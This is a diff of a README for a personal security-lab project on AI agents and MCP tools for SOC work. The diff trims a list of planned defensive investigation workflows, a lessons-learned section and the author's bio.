-Real telemetry samples (for example `sample_data/aihost_*.log`) are listed in `.gitignore` and should **not** be committed to the repository. Keep local auth log exports on your machine for lab use only.
-
----
-
-# Planned Future Enhancements
-
-- Malware Investigation Workflow
-- PowerShell Investigation Workflow
-- Privilege Escalation Workflow
-- Persistence Detection Workflow
-- Threat Intelligence Enrichment
-- IOC Reputation Lookups
-- Integration with Future AI Security Labs
-
----
-
-# Lessons Learned
-
-The most important takeaway from this lab:
-
-```text
-AI reasons.
-MCP tools perform actions.
-Workflows combine tools into useful outcomes.
-```
-
-This project demonstrates how AI agents can augment security operations by combining reasoning, structured tooling, and repeatable workflows.
-
----
-
-# Author
+## Author
 
 Sydney McGee
 
-Cybersecurity Analyst | Security Automation Enthusiast | AI Security Engineering Learner
-
-Current Focus:
-
-- AI Agents
-- MCP
-- Security Automation
-- Detection Engineering
-- Security Engineering
-- AI Security Engineering
-- SOC Workflow Automation
+Cybersecurity Analyst · Security Automation · AI Security Engineering
